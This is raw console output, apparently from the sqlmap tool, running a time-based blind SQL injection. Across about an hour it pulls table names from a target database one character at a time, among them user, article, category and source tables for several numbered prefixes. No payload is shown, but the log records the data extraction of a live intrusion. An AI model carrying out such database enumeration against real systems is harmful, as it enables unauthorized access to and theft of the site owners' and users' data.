+[00:19:01] [INFO] retrieved: _________________[00:19:01] [INFO] retrieved: [00:19:25] [INFO] retrieved: 5________________ 1/17 (5%)[00:19:33] [INFO] retrieved: 5s_______________ 2/17 (11%)[00:19:33] [INFO] retrieved: 5s_u_____________ 3/17 (17%)[00:19:37] [INFO] retrieved: 5sou_____________ 4/17 (23%)[00:19:49] [INFO] retrieved: 5sou_c___________ 5/17 (29%)[00:19:50] [INFO] retrieved: 5sou_ce__________ 6/17 (35%)[00:19:58] [INFO] retrieved: 5source__________ 7/17 (41%)[00:19:59] [INFO] retrieved: 5sources_________ 8/17 (47%)[00:20:08] [INFO] retrieved: 5sources_i_______ 9/17 (52%)[00:20:09] [INFO] retrieved: 5sources_i_a_____ 10/17 (58%)[00:20:30] [INFO] retrieved: 5sources_i_a_____ 11/17 (64%)[00:20:30] [INFO] retrieved: 5sources_ina_____ 12/17 (70%)[00:20:42] [INFO] retrieved: 5sources_ina___a_ 13/17 (76%)[00:20:44] [INFO] retrieved: 5sources_inap__a_ 14/17 (82%)[00:20:45] [INFO] retrieved: 5sources_inapp_a_ 15/17 (88%)[00:20:55] [INFO] retrieved: 5sources_inapp_ad 16/17 (94%)[00:20:58] [INFO] retrieved: 5sources_inapp_ad             [00:20:58] [INFO] retrieved: 5sources_inapp_ad
+[00:20:58] [INFO] retrieving the length of query output
+[00:20:58] [INFO] retrieved: 7
+[00:21:06] [INFO] retrieved: _______[00:21:06] [INFO] retrieved: [00:21:30] [INFO] retrieved: 5______ 1/7 (14%)[00:21:31] [INFO] retrieved: 5__e___ 2/7 (28%)[00:21:37] [INFO] retrieved: 5_se___ 3/7 (42%)[00:21:38] [INFO] retrieved: 5use___ 4/7 (57%)[00:21:47] [INFO] retrieved: 5use__1 5/7 (71%)[00:21:55] [INFO] retrieved: 5user_1 6/7 (85%)[00:21:58] [INFO] retrieved: 5user_1           [00:21:58] [INFO] retrieved: 5user_1
+[00:21:58] [INFO] retrieving the length of query output
+[00:21:58] [INFO] retrieved: 7
+[00:22:06] [INFO] retrieved: _______[00:22:06] [INFO] retrieved: [00:22:30] [INFO] retrieved: 5______ 1/7 (14%)[00:22:30] [INFO] retrieved: 5__e___ 2/7 (28%)[00:22:34] [INFO] retrieved: 5u_e___ 3/7 (42%)[00:22:37] [INFO] retrieved: 5use___ 4/7 (57%)[00:22:54] [INFO] retrieved: 5use__5 5/7 (71%)[00:22:58] [INFO] retrieved: 5user_5 6/7 (85%)[00:23:01] [INFO] retrieved: 5user_5           [00:23:01] [INFO] retrieved: 5user_5
+[00:23:01] [INFO] retrieving the length of query output
+[00:23:01] [INFO] retrieved: 9
+[00:23:11] [INFO] retrieved: _________[00:23:11] [INFO] retrieved: [00:23:34] [INFO] retrieved: 5________ 1/9 (11%)[00:23:35] [INFO] retrieved: 5__e_____ 2/9 (22%)[00:23:42] [INFO] retrieved: 5_se_____ 3/9 (33%)[00:23:42] [INFO] retrieved: 5use_____ 4/9 (44%)[00:23:55] [INFO] retrieved: 5use___a_ 5/9 (55%)[00:24:00] [INFO] retrieved: 5use__ca_ 6/9 (66%)[00:24:07] [INFO] retrieved: 5user_ca_ 7/9 (77%)[00:24:11] [INFO] retrieved: 5user_ca_ 8/9 (88%)[00:24:14] [INFO] retrieved: 5user_cat           [00:24:14] [INFO] retrieved: 5user_cat
+[00:24:14] [INFO] retrieving the length of query output
+[00:24:14] [INFO] retrieved: 15
+[00:24:26] [INFO] retrieved: _______________[00:24:26] [INFO] retrieved: [00:24:50] [INFO] retrieved: 5______________ 1/15 (6%)[00:24:50] [INFO] retrieved: 5__e___________ 2/15 (13%)[00:24:56] [INFO] retrieved: 5u_e___________ 3/15 (20%)[00:24:57] [INFO] retrieved: 5use___________ 4/15 (26%)[00:25:14] [INFO] retrieved: 5use___i_______ 5/15 (33%)[00:25:20] [INFO] retrieved: 5use__li_______ 6/15 (40%)[00:25:27] [INFO] retrieved: 5user_li_______ 7/15 (46%)[00:25:33] [INFO] retrieved: 5user_li_______ 8/15 (53%)[00:25:35] [INFO] retrieved: 5user_lis______ 9/15 (60%)[00:25:48] [INFO] retrieved: 5user_list_____ 10/15 (66%)[00:25:49] [INFO] retrieved: 5user_lists____ 11/15 (73%)[00:25:56] [INFO] retrieved: 5user_lists_f__ 12/15 (80%)[00:26:09] [INFO] retrieved: 5user_lists_f__ 13/15 (86%)[00:26:11] [INFO] retrieved: 5user_lists_fo_ 14/15 (93%)[00:26:11] [INFO] retrieved: 5user_lists_fol             [00:26:11] [INFO] retrieved: 5user_lists_fol
+[00:26:11] [INFO] retrieving the length of query output
+[00:26:11] [INFO] retrieved: 13
+[00:26:25] [INFO] retrieved: _____________[00:26:25] [INFO] retrieved: [00:26:50] [INFO] retrieved: 5____________ 1/13 (7%)[00:26:50] [INFO] retrieved: 5__e_________ 2/13 (15%)[00:26:56] [INFO] retrieved: 5u_e_________ 3/13 (23%)[00:26:57] [INFO] retrieved: 5use_________ 4/13 (30%)[00:27:21] [INFO] retrieved: 5use__s______ 5/13 (38%)[00:27:27] [INFO] retrieved: 5user_s______ 6/13 (46%)[00:27:28] [INFO] retrieved: 5user_so_____ 7/13 (53%)[00:27:34] [INFO] retrieved: 5user_so_____ 8/13 (61%)[00:27:43] [INFO] retrieved: 5user_sou____ 9/13 (69%)[00:27:44] [INFO] retrieved: 5user_sou_c__ 10/13 (76%)[00:27:49] [INFO] retrieved: 5user_sourc__ 11/13 (84%)[00:27:50] [INFO] retrieved: 5user_source_ 12/13 (92%)[00:27:55] [INFO] retrieved: 5user_sources             [00:27:55] [INFO] retrieved: 5user_sources
+[00:27:55] [INFO] retrieving the length of query output
+[00:27:55] [INFO] retrieved: 8
+[00:28:05] [INFO] retrieved: ________[00:28:05] [INFO] retrieved: [00:28:23] [INFO] retrieved: _a______ 1/8 (12%)[00:28:32] [INFO] retrieved: 6a______ 2/8 (25%)[00:28:34] [INFO] retrieved: 6ar_____ 3/8 (37%)[00:28:40] [INFO] retrieved: 6art____ 4/8 (50%)[00:28:48] [INFO] retrieved: 6art__e_ 5/8 (62%)[00:28:52] [INFO] retrieved: 6art_ke_ 6/8 (75%)[00:28:57] [INFO] retrieved: 6art_ke_ 7/8 (87%)[00:28:58] [INFO] retrieved: 6art_key           [00:28:58] [INFO] retrieved: 6art_key
+[00:28:58] [INFO] retrieving the length of query output
+[00:28:58] [INFO] retrieved: 9
+[00:29:08] [INFO] retrieved: _________[00:29:08] [INFO] retrieved: [00:29:28] [INFO] retrieved: _a_______ 1/9 (11%)[00:29:38] [INFO] retrieved: 6a_______ 2/9 (22%)[00:29:38] [INFO] retrieved: 6ar______ 3/9 (33%)[00:29:45] [INFO] retrieved: 6art_____ 4/9 (44%)[00:29:54] [INFO] retrieved: 6art__e__ 5/9 (55%)[00:30:05] [INFO] retrieved: 6art__e__ 6/9 (66%)[00:30:06] [INFO] retrieved: 6art_te__ 7/9 (77%)[00:30:12] [INFO] retrieved: 6art_tex_ 8/9 (88%)[00:30:14] [INFO] retrieved: 6art_text           [00:30:14] [INFO] retrieved: 6art_text
+[00:30:14] [INFO] retrieving the length of query output
+[00:30:14] [INFO] retrieved: 9
+[00:30:24] [INFO] retrieved: _________[00:30:24] [INFO] retrieved: [00:30:44] [INFO] retrieved: _a_______ 1/9 (11%)[00:30:54] [INFO] retrieved: 6a_______ 2/9 (22%)[00:30:55] [INFO] retrieved: 6ar______ 3/9 (33%)[00:30:58] [INFO] retrieved: 6ar_i____ 4/9 (44%)[00:31:02] [INFO] retrieved: 6arti____ 5/9 (55%)[00:31:11] [INFO] retrieved: 6artic___ 6/9 (66%)[00:31:13] [INFO] retrieved: 6artic_e_ 7/9 (77%)[00:31:17] [INFO] retrieved: 6article_ 8/9 (88%)[00:31:18] [INFO] retrieved: 6articles           [00:31:18] [INFO] retrieved: 6articles
+[00:31:18] [INFO] retrieving the length of query output
+[00:31:18] [INFO] retrieved: 11
+[00:31:25] [INFO] retrieved: ___________[00:31:25] [INFO] retrieved: [00:31:45] [INFO] retrieved: _a_________ 1/11 (9%)[00:31:56] [INFO] retrieved: 6a_________ 2/11 (18%)[00:31:57] [INFO] retrieved: 6ar________ 3/11 (27%)[00:32:00] [INFO] retrieved: 6ar_i______ 4/11 (36%)[00:32:04] [INFO] retrieved: 6arti______ 5/11 (45%)[00:32:12] [INFO] retrieved: 6arti__e___ 6/11 (54%)[00:32:12] [INFO] retrieved: 6artic_e___ 7/11 (63%)[00:32:25] [INFO] retrieved: 6artic_e__1 8/11 (72%)[00:32:25] [INFO] retrieved: 6article__1 9/11 (81%)[00:32:26] [INFO] retrieved: 6articles_1 10/11 (90%)[00:32:39] [INFO] retrieved: 6articles_1             [00:32:39] [INFO] retrieved: 6articles_1
+[00:32:39] [INFO] retrieving the length of query output
+[00:32:39] [INFO] retrieved: 11
+[00:32:48] [INFO] retrieved: ___________[00:32:48] [INFO] retrieved: [00:33:08] [INFO] retrieved: __a________ 1/11 (9%)[00:33:12] [INFO] retrieved: _ca________ 2/11 (18%)[00:33:18] [INFO] retrieved: 6ca________ 3/11 (27%)[00:33:24] [INFO] retrieved: 6cat_______ 4/11 (36%)[00:33:24] [INFO] retrieved: 6cate______ 5/11 (45%)[00:33:33] [INFO] retrieved: 6categ_____ 6/11 (54%)[00:33:42] [INFO] retrieved: 6categ__i__ 7/11 (63%)[00:33:46] [INFO] retrieved: 6categ_ri__ 8/11 (72%)[00:33:46] [INFO] retrieved: 6categori__ 9/11 (81%)[00:33:47] [INFO] retrieved: 6categorie_ 10/11 (90%)[00:33:54] [INFO] retrieved: 6categories             [00:33:54] [INFO] retrieved: 6categories
+[00:33:54] [INFO] retrieving the length of query output
+[00:33:54] [INFO] retrieved: 16
+[00:34:08] [INFO] retrieved: ________________[00:34:08] [INFO] retrieved: [00:34:32] [INFO] retrieved: _c______________ 1/16 (6%)[00:34:39] [INFO] retrieved: 6c______________ 2/16 (12%)[00:34:39] [INFO] retrieved: 6cu_____________ 3/16 (18%)[00:34:40] [INFO] retrieved: 6cus____________ 4/16 (25%)[00:35:02] [INFO] retrieved: 6cust___________ 5/16 (31%)[00:35:03] [INFO] retrieved: 6cust_m_________ 6/16 (37%)[00:35:11] [INFO] retrieved: 6custom_________ 7/16 (43%)[00:35:20] [INFO] retrieved: 6custom__e______ 8/16 (50%)[00:35:22] [INFO] retrieved: 6custom__e______ 9/16 (56%)[00:35:27] [INFO] retrieved: 6custom_se______ 10/16 (62%)[00:35:28] [INFO] retrieved: 6custom_sec_____ 11/16 (68%)[00:35:38] [INFO] retrieved: 6custom_sec_i___ 12/16 (75%)[00:35:50] [INFO] retrieved: 6custom_secti___ 13/16 (81%)[00:35:55] [INFO] retrieved: 6custom_sectio__ 14/16 (87%)[00:35:56] [INFO] retrieved: 6custom_section_ 15/16 (93%)[00:35:57] [INFO] retrieved: 6custom_sections             [00:35:57] [INFO] retrieved: 6custom_sections
+[00:35:57] [INFO] retrieving the length of query output
+[00:35:57] [INFO] retrieved: 13
+[00:36:09] [INFO] retrieved: _____________[00:36:09] [INFO] retrieved: [00:36:34] [INFO] retrieved: _c___________ 1/13 (7%)[00:36:39] [INFO] retrieved: 6c___________ 2/13 (15%)[00:36:40] [INFO] retrieved: 6cu__________ 3/13 (23%)[00:36:40] [INFO] retrieved: 6cus_________ 4/13 (30%)[00:37:02] [INFO] retrieved: 6cust________ 5/13 (38%)[00:37:03] [INFO] retrieved: 6cust_m______ 6/13 (46%)[00:37:11] [INFO] retrieved: 6custom______ 7/13 (53%)[00:37:20] [INFO] retrieved: 6custom__i___ 8/13 (61%)[00:37:20] [INFO] retrieved: 6custom__i___ 9/13 (69%)[00:37:30] [INFO] retrieved: 6custom_ti___ 10/13 (76%)[00:37:34] [INFO] retrieved: 6custom_ti_e_ 11/13 (84%)[00:37:34] [INFO] retrieved: 6custom_tile_ 12/13 (92%)[00:37:37] [INFO] retrieved: 6custom_tiles             [00:37:37] [INFO] retrieved: 6custom_tiles
+[00:37:37] [INFO] retrieving the length of query output
+[00:37:37] [INFO] retrieved: 15
+[00:37:49] [INFO] retrieved: _______________[00:37:49] [INFO] retrieved: [00:38:15] [INFO] retrieved: ___e___________ 1/15 (6%)[00:38:21] [INFO] retrieved: _f_e___________ 2/15 (13%)[00:38:21] [INFO] retrieved: 6f_e___________ 3/15 (20%)[00:38:22] [INFO] retrieved: 6fre___________ 4/15 (26%)[00:38:30] [INFO] retrieved: 6free__________ 5/15 (33%)[00:38:38] [INFO] retrieved: 6free__e_______ 6/15 (40%)[00:38:44] [INFO] retrieved: 6freeu_e_______ 7/15 (46%)[00:38:45] [INFO] retrieved: 6freeuse_______ 8/15 (53%)[00:38:52] [INFO] retrieved: 6freeuser______ 9/15 (60%)[00:39:02] [INFO] retrieved: 6freeuser__i___ 10/15 (66%)[00:39:15] [INFO] retrieved: 6freeuser_ti___ 11/15 (73%)[00:39:18] [INFO] retrieved: 6freeuser_ti_e_ 12/15 (80%)[00:39:21] [INFO] retrieved: 6freeuser_tile_ 13/15 (86%)[00:39:22] [INFO] retrieved: 6freeuser_tile_ 14/15 (93%)[00:39:28] [INFO] retrieved: 6freeuser_tiles             [00:39:28] [INFO] retrieved: 6freeuser_tiles
+[00:39:28] [INFO] retrieving the length of query output
+[00:39:28] [INFO] retrieved: 12
+[00:39:39] [INFO] retrieved: ____________[00:39:39] [INFO] retrieved: [00:40:05] [INFO] retrieved: _i__________ 1/12 (8%)[00:40:10] [INFO] retrieved: _im_________ 2/12 (16%)[00:40:11] [INFO] retrieved: 6im_________ 3/12 (25%)[00:40:11] [INFO] retrieved: 6img________ 4/12 (33%)[00:40:26] [INFO] retrieved: 6img__b_____ 5/12 (41%)[00:40:28] [INFO] retrieved: 6img__bi____ 6/12 (50%)[00:40:33] [INFO] retrieved: 6img_fbi____ 7/12 (58%)[00:40:45] [INFO] retrieved: 6img_fbi____ 8/12 (66%)[00:40:48] [INFO] retrieved: 6img_fbi__e_ 9/12 (75%)[00:40:50] [INFO] retrieved: 6img_fbid_e_ 10/12 (83%)[00:40:50] [INFO] retrieved: 6img_fbidde_ 11/12 (91%)[00:40:59] [INFO] retrieved: 6img_fbidden             [00:40:59] [INFO] retrieved: 6img_fbidden
+[00:40:59] [INFO] retrieving the length of query output
+[00:40:59] [INFO] retrieved: 5
+[00:41:07] [INFO] retrieved: _____[00:41:07] [INFO] retrieved: [00:41:32] [INFO] retrieved: __e__ 1/5 (20%)[00:41:37] [INFO] retrieved: 6_e__ 2/5 (40%)[00:41:38] [INFO] retrieved: 6_ey_ 3/5 (60%)[00:41:38] [INFO] retrieved: 6key_ 4/5 (80%)[00:41:47] [INFO] retrieved: 6keyw           [00:41:47] [INFO] retrieved: 6keyw
+[00:41:47] [INFO] retrieving the length of query output
+[00:41:47] [INFO] retrieved: 13
+[00:42:01] [INFO] retrieved: _____________[00:42:01] [INFO] retrieved: [00:42:26] [INFO] retrieved: __i__________ 1/13 (7%)[00:42:32] [INFO] retrieved: __is_________ 2/13 (15%)[00:42:32] [INFO] retrieved: 6_is_________ 3/13 (23%)[00:42:38] [INFO] retrieved: 6lis_________ 4/13 (30%)[00:42:54] [INFO] retrieved: 6list________ 5/13 (38%)[00:42:55] [INFO] retrieved: 6list_s______ 6/13 (46%)[00:43:08] [INFO] retrieved: 6list_so_____ 7/13 (53%)[00:43:16] [INFO] retrieved: 6list_so_r___ 8/13 (61%)[00:43:16] [INFO] retrieved: 6list_so_r___ 9/13 (69%)[00:43:17] [INFO] retrieved: 6list_sour___ 10/13 (76%)[00:43:23] [INFO] retrieved: 6list_sourc__ 11/13 (84%)[00:43:28] [INFO] retrieved: 6list_source_ 12/13 (92%)[00:43:29] [INFO] retrieved: 6list_sources             [00:43:29] [INFO] retrieved: 6list_sources
+[00:43:29] [INFO] retrieving the length of query output
+[00:43:29] [INFO] retrieved: 6
+[00:43:33] [INFO] retrieved: ______[00:43:33] [INFO] retrieved: [00:43:57] [INFO] retrieved: __i___ 1/6 (16%)[00:44:04] [INFO] retrieved: 6_i___ 2/6 (33%)[00:44:04] [INFO] retrieved: 6_is__ 3/6 (50%)[00:44:09] [INFO] retrieved: 6lis__ 4/6 (66%)[00:44:17] [INFO] retrieved: 6list_ 5/6 (83%)[00:44:18] [INFO] retrieved: 6lists           [00:44:18] [INFO] retrieved: 6lists
+[00:44:18] [INFO] retrieving the length of query output
+[00:44:18] [INFO] retrieved: 13
+[00:44:31] [INFO] retrieved: _____________[00:44:31] [INFO] retrieved: [00:44:50] [INFO] retrieved: __a__________ 1/13 (7%)[00:44:55] [INFO] retrieved: __ai_________ 2/13 (15%)[00:45:01] [INFO] retrieved: 6_ai_________ 3/13 (23%)[00:45:02] [INFO] retrieved: 6mai_________ 4/13 (30%)[00:45:18] [INFO] retrieved: 6main________ 5/13 (38%)[00:45:26] [INFO] retrieved: 6main_s______ 6/13 (46%)[00:45:34] [INFO] retrieved: 6main_so_____ 7/13 (53%)[00:45:41] [INFO] retrieved: 6main_so_____ 8/13 (61%)[00:45:42] [INFO] retrieved: 6main_sou____ 9/13 (69%)[00:45:50] [INFO] retrieved: 6main_sour___ 10/13 (76%)[00:45:50] [INFO] retrieved: 6main_sourc__ 11/13 (84%)[00:45:54] [INFO] retrieved: 6main_source_ 12/13 (92%)[00:45:57] [INFO] retrieved: 6main_sources             [00:45:57] [INFO] retrieved: 6main_sources
+[00:45:57] [INFO] retrieving the length of query output
+[00:45:57] [INFO] retrieved: 5
+[00:46:05] [INFO] retrieved: _____[00:46:05] [INFO] retrieved: [00:46:30] [INFO] retrieved: __e__ 1/5 (20%)[00:46:37] [INFO] retrieved: 6_e__ 2/5 (40%)[00:46:42] [INFO] retrieved: 6_ew_ 3/5 (60%)[00:46:42] [INFO] retrieved: 6new_ 4/5 (80%)[00:46:46] [INFO] retrieved: 6news           [00:46:46] [INFO] retrieved: 6news
+[00:46:46] [INFO] retrieving the length of query output
+[00:46:46] [INFO] retrieved: 9
+[00:46:56] [INFO] retrieved: _________[00:46:56] [INFO] retrieved: [00:47:21] [INFO] retrieved: __e______ 1/9 (11%)[00:47:27] [INFO] retrieved: 6_e______ 2/9 (22%)[00:47:34] [INFO] retrieved: 6_ew_____ 3/9 (33%)[00:47:35] [INFO] retrieved: 6new_____ 4/9 (44%)[00:47:44] [INFO] retrieved: 6news____ 5/9 (55%)[00:47:46] [INFO] retrieved: 6news__a_ 6/9 (66%)[00:47:50] [INFO] retrieved: 6news_ca_ 7/9 (77%)[00:47:58] [INFO] retrieved: 6news_ca_ 8/9 (88%)[00:48:00] [INFO] retrieved: 6news_cat           [00:48:00] [INFO] retrieved: 6news_cat
+[00:48:00] [INFO] retrieving the length of query output
+[00:48:00] [INFO] retrieved: 9
+[00:48:10] [INFO] retrieved: _________[00:48:10] [INFO] retrieved: [00:48:34] [INFO] retrieved: __e______ 1/9 (11%)[00:48:41] [INFO] retrieved: 6_e______ 2/9 (22%)[00:48:48] [INFO] retrieved: 6ne______ 3/9 (33%)[00:48:49] [INFO] retrieved: 6new_____ 4/9 (44%)[00:48:57] [INFO] retrieved: 6news____ 5/9 (55%)[00:49:06] [INFO] retrieved: 6news__e_ 6/9 (66%)[00:49:11] [INFO] retrieved: 6news_ke_ 7/9 (77%)[00:49:15] [INFO] retrieved: 6news_key 8/9 (88%)[00:49:18] [INFO] retrieved: 6news_key           [00:49:18] [INFO] retrieved: 6news_key
+[00:49:18] [INFO] retrieving the length of query output
+[00:49:18] [INFO] retrieved: 7
+[00:49:25] [INFO] retrieved: _______[00:49:25] [INFO] retrieved: [00:49:46] [INFO] retrieved: ___a___ 1/7 (14%)[00:49:55] [INFO] retrieved: _s_a___ 2/7 (28%)[00:49:55] [INFO] retrieved: 6s_a___ 3/7 (42%)[00:50:01] [INFO] retrieved: 6sha___ 4/7 (57%)[00:50:04] [INFO] retrieved: 6shar__ 5/7 (71%)[00:50:08] [INFO] retrieved: 6share_ 6/7 (85%)[00:50:10] [INFO] retrieved: 6shares           [00:50:10] [INFO] retrieved: 6shares
+[00:50:10] [INFO] retrieving the length of query output
+[00:50:10] [INFO] retrieved: 8
+[00:50:20] [INFO] retrieved: ________[00:50:20] [INFO] retrieved: [00:50:51] [INFO] retrieved: 6_______ 1/8 (12%)[00:50:51] [INFO] retrieved: 6s______ 2/8 (25%)[00:50:53] [INFO] retrieved: 6s_u____ 3/8 (37%)[00:50:58] [INFO] retrieved: 6sou____ 4/8 (50%)[00:51:08] [INFO] retrieved: 6sou_c__ 5/8 (62%)[00:51:09] [INFO] retrieved: 6sou_ce_ 6/8 (75%)[00:51:13] [INFO] retrieved: 6sou_ces 7/8 (87%)[00:51:15] [INFO] retrieved: 6sources           [00:51:16] [INFO] retrieved: 6sources
+[00:51:16] [INFO] retrieving the length of query output
+[00:51:16] [INFO] retrieved: 17
+[00:51:26] [INFO] retrieved: _________________[00:51:26] [INFO] retrieved: [00:51:57] [INFO] retrieved: 6________________ 1/17 (5%)[00:51:58] [INFO] retrieved: 6s_______________ 2/17 (11%)[00:51:59] [INFO] retrieved: 6s_u_____________ 3/17 (17%)[00:52:05] [INFO] retrieved: 6sou_____________ 4/17 (23%)[00:52:14] [INFO] retrieved: 6sou_c___________ 5/17 (29%)[00:52:16] [INFO] retrieved: 6sou_ce__________ 6/17 (35%)[00:52:27] [INFO] retrieved: 6sou_ces_________ 7/17 (41%)[00:52:31] [INFO] retrieved: 6sources_________ 8/17 (47%)[00:52:32] [INFO] retrieved: 6sources_i_______ 9/17 (52%)[00:52:41] [INFO] retrieved: 6sources_i_a_____ 10/17 (58%)[00:52:55] [INFO] retrieved: 6sources_ina_____ 11/17 (64%)[00:52:55] [INFO] retrieved: 6sources_ina_____ 12/17 (70%)[00:53:08] [INFO] retrieved: 6sources_ina___a_ 13/17 (76%)[00:53:08] [INFO] retrieved: 6sources_inap__a_ 14/17 (82%)[00:53:13] [INFO] retrieved: 6sources_inapp_a_ 15/17 (88%)[00:53:21] [INFO] retrieved: 6sources_inapp_ad 16/17 (94%)[00:53:24] [INFO] retrieved: 6sources_inapp_ad             [00:53:24] [INFO] retrieved: 6sources_inapp_ad
+[00:53:24] [INFO] retrieving the length of query output
+[00:53:24] [INFO] retrieved: 7
+[00:53:32] [INFO] retrieved: _______[00:53:32] [INFO] retrieved: [00:53:56] [INFO] retrieved: ___e___ 1/7 (14%)[00:54:03] [INFO] retrieved: 6__e___ 2/7 (28%)[00:54:03] [INFO] retrieved: 6_se___ 3/7 (42%)[00:54:05] [INFO] retrieved: 6use___ 4/7 (57%)[00:54:13] [INFO] retrieved: 6use__1 5/7 (71%)[00:54:14] [INFO] retrieved: 6user_1 6/7 (85%)[00:54:23] [INFO] retrieved: 6user_1           [00:54:23] [INFO] retrieved: 6user_1
+[00:54:23] [INFO] retrieving the length of query output
+[00:54:23] [INFO] retrieved: 7
+[00:54:31] [INFO] retrieved: _______[00:54:31] [INFO] retrieved: [00:54:57] [INFO] retrieved: ___e___ 1/7 (14%)[00:55:03] [INFO] retrieved: 6__e___ 2/7 (28%)[00:55:04] [INFO] retrieved: 6_se___ 3/7 (42%)[00:55:05] [INFO] retrieved: 6use___ 4/7 (57%)[00:55:16] [INFO] retrieved: 6user__ 5/7 (71%)[00:55:22] [INFO] retrieved: 6user_6 6/7 (85%)[00:55:27] [INFO] retrieved: 6user_6           [00:55:27] [INFO] retrieved: 6user_6
+[00:55:27] [INFO] retrieving the length of query output
+[00:55:27] [INFO] retrieved: 9
+[00:55:37] [INFO] retrieved: _________[00:55:37] [INFO] retrieved: [00:56:01] [INFO] retrieved: ___e_____ 1/9 (11%)[00:56:08] [INFO] retrieved: 6__e_____ 2/9 (22%)[00:56:09] [INFO] retrieved: 6_se_____ 3/9 (33%)[00:56:09] [INFO] retrieved: 6use_____ 4/9 (44%)[00:56:20] [INFO] retrieved: 6use___a_ 5/9 (55%)[00:56:26] [INFO] retrieved: 6user__a_ 6/9 (66%)[00:56:26] [INFO] retrieved: 6user_ca_ 7/9 (77%)[00:56:39] [INFO] retrieved: 6user_cat 8/9 (88%)[00:56:39] [INFO] retrieved: 6user_cat           [00:56:39] [INFO] retrieved: 6user_cat
+[00:56:39] [INFO] retrieving the length of query output
+[00:56:39] [INFO] retrieved: 15
+[00:56:51] [INFO] retrieved: _______________[00:56:51] [INFO] retrieved: [00:57:15] [INFO] retrieved: ___e___________ 1/15 (6%)[00:57:21] [INFO] retrieved: 6__e___________ 2/15 (13%)[00:57:23] [INFO] retrieved: 6u_e___________ 3/15 (20%)[00:57:23] [INFO] retrieved: 6use___________ 4/15 (26%)[00:57:39] [INFO] retrieved: 6user__________ 5/15 (33%)[00:57:42] [INFO] retrieved: 6user__i_______ 6/15 (40%)[00:57:50] [INFO] retrieved: 6user_li_______ 7/15 (46%)[00:58:02] [INFO] retrieved: 6user_lis______ 8/15 (53%)[00:58:02] [INFO] retrieved: 6user_lis______ 9/15 (60%)[00:58:10] [INFO] retrieved: 6user_list_____ 10/15 (66%)[00:58:11] [INFO] retrieved: 6user_lists____ 11/15 (73%)[00:58:26] [INFO] retrieved: 6user_lists_f__ 12/15 (80%)[00:58:37] [INFO] retrieved: 6user_lists_f_l 13/15 (86%)[00:58:37] [INFO] retrieved: 6user_lists_fol 14/15 (93%)[00:58:39] [INFO] retrieved: 6user_lists_fol             [00:58:39] [INFO] retrieved: 6user_lists_fol
+[00:58:39] [INFO] retrieving the length of query output
+[00:58:39] [INFO] retrieved: 13
+[00:58:51] [INFO] retrieved: _____________[00:58:51] [INFO] retrieved: [00:59:16] [INFO] retrieved: ___e_________ 1/13 (7%)[00:59:21] [INFO] retrieved: __se_________ 2/13 (15%)[00:59:21] [INFO] retrieved: 6_se_________ 3/13 (23%)[00:59:22] [INFO] retrieved: 6use_________ 4/13 (30%)[00:59:37] [INFO] retrieved: 6user________ 5/13 (38%)[00:59:44] [INFO] retrieved: 6user_s______ 6/13 (46%)[00:59:52] [INFO] retrieved: 6user_so_____ 7/13 (53%)[01:00:00] [INFO] retrieved: 6user_sou____ 8/13 (61%)[01:00:02] [INFO] retrieved: 6user_sou____ 9/13 (69%)[01:00:08] [INFO] retrieved: 6user_sour___ 10/13 (76%)[01:00:09] [INFO] retrieved: 6user_sourc__ 11/13 (84%)[01:00:14] [INFO] retrieved: 6user_source_ 12/13 (92%)[01:00:17] [INFO] retrieved: 6user_sources             [01:00:17] [INFO] retrieved: 6user_sources
+[01:00:17] [INFO] retrieving the length of query output
+[01:00:17] [INFO] retrieved: 8
+[01:00:26] [INFO] retrieved: ________[01:00:26] [INFO] retrieved: [01:00:46] [INFO] retrieved: _a______ 1/8 (12%)[01:00:56] [INFO] retrieved: 7a______ 2/8 (25%)[01:00:57] [INFO] retrieved: 7ar_____ 3/8 (37%)[01:01:01] [INFO] retrieved: 7art____ 4/8 (50%)[01:01:14] [INFO] retrieved: 7art__e_ 5/8 (62%)[01:01:19] [INFO] retrieved: 7art_ke_ 6/8 (75%)[01:01:20] [INFO] retrieved: 7art_key 7/8 (87%)[01:01:21] [INFO] retrieved: 7art_key           [01:01:21] [INFO] retrieved: 7art_key
+[01:01:21] [INFO] retrieving the length of query output
+[01:01:21] [INFO] retrieved: 9
+[01:01:30] [INFO] retrieved: _________[01:01:30] [INFO] retrieved: [01:01:47] [INFO] retrieved: _a_______ 1/9 (11%)[01:02:00] [INFO] retrieved: 7a_______ 2/9 (22%)[01:02:00] [INFO] retrieved: 7ar______ 3/9 (33%)[01:02:01] [INFO] retrieved: 7art_____ 4/9 (44%)[01:02:21] [INFO] retrieved: 7art__e__ 5/9 (55%)[01:02:36] [INFO] retrieved: 7art_te__ 6/9 (66%)[01:02:37] [INFO] retrieved: 7art_te__ 7/9 (77%)[01:02:41] [INFO] retrieved: 7art_tex_ 8/9 (88%)[01:02:44] [INFO] retrieved: 7art_text           [01:02:44] [INFO] retrieved: 7art_text
+[01:02:44] [INFO] retrieving the length of query output
+[01:02:44] [INFO] retrieved: 9
+[01:02:54] [INFO] retrieved: _________[01:02:54] [INFO] retrieved: [01:03:15] [INFO] retrieved: _a_______ 1/9 (11%)[01:03:23] [INFO] retrieved: 7a_______ 2/9 (22%)[01:03:24] [INFO] retrieved: 7ar______ 3/9 (33%)[01:03:30] [INFO] retrieved: 7art_____ 4/9 (44%)[01:03:32] [INFO] retrieved: 7arti____ 5/9 (55%)[01:03:39] [INFO] retrieved: 7artic___ 6/9 (66%)[01:03:44] [INFO] retrieved: 7artic_e_ 7/9 (77%)[01:03:48] [INFO] retrieved: 7article_ 8/9 (88%)[01:03:49] [INFO] retrieved: 7articles           [01:03:49] [INFO] retrieved: 7articles
+[01:03:49] [INFO] retrieving the length of query output
+[01:03:49] [INFO] retrieved: 11
+[01:03:57] [INFO] retrieved: ___________[01:03:57] [INFO] retrieved: [01:04:16] [INFO] retrieved: _a_________ 1/11 (9%)[01:04:26] [INFO] retrieved: 7a_________ 2/11 (18%)[01:04:29] [INFO] retrieved: 7ar________ 3/11 (27%)[01:04:34] [INFO] retrieved: 7ar_i______ 4/11 (36%)[01:04:35] [INFO] retrieved: 7arti______ 5/11 (45%)[01:04:42] [INFO] retrieved: 7artic_____ 6/11 (54%)[01:04:50] [INFO] retrieved: 7artic_e___ 7/11 (63%)[01:04:56] [INFO] retrieved: 7article___ 8/11 (72%)[01:04:57] [INFO] retrieved: 7articles__ 9/11 (81%)[01:05:00] [INFO] retrieved: 7articles_1 10/11 (90%)[01:05:06] [INFO] retrieved: 7articles_1             [01:05:07] [INFO] retrieved: 7articles_1
+[01:05:07] [INFO] retrieving the length of query output
+[01:05:07] [INFO] retrieved: 11
